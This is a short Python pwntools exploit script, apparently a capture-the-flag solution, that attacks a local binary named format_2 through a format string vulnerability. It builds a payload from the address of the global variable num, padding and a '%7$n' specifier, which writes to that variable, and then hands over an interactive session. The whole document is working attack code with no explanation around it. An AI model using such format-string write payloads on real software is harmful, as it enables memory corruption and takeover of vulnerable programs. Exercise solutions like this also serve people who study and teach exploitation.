from pwn import*
context.log_level = 'debug'
o = process("./format_2")
elf = ELF("./format_2")
num = elf.sym['num']
payload = p32(num) + b"a"*6 + b"%7$n"
pause()
o.sendline(payload)

o.interactive()
